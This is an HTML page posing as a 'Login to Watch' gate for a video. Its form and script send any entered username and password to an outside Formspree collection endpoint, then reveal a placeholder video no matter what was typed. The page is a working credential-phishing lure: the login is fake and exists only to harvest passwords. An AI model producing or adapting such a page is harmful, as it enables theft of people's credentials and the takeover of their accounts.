<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login to Watch</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    input {
      padding: 10px;
      width: 250px;
      font-size: 16px;
      margin: 5px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
    #videoContainer { display: none; margin-top: 30px; }
  </style>
</head>
<body>

  <h2>Login to Watch the Video</h2>
  <form id="infoForm" action="https://formspree.io/f/xpwryznv" method="POST">
    <input type="text" name="username" placeholder="Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br><br>
    <button type="submit">Login</button>
  </form>

  <div id="videoContainer">
    <h3>Welcome! Enjoy the video:</h3>
    <video width="600" controls>
      <source src="your_video_link.mp4" type="video/mp4">
      Your browser does not support the video tag.
    </video>
  </div>

  <script>
    const form = document.getElementById('infoForm');
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      fetch(form.action, {
        method: 'POST',
        body: new FormData(form)
      }).then(() => {
        form.style.display = 'none';
        document.getElementById('videoContainer').style.display = 'block';
      });
    });
  </script>

</body>
</html>
